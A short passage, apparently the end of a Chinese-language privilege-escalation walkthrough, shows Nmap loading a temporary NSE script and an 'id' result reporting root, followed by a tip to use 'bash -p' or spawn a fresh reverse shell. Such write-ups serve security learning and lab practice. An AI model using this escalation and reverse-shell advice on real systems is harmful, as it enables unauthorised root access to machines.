NSE: Warning: Loading '/tmp/tmp.C0v28yTvbc' -- the recommended file extension is '.nse'.
id
uid=0(root) gid=0(root) groups=0(root)
```

拿到root了，如果你觉得交互shell不好用bash -p 或者自己再弹一个shell回来加固一下就好了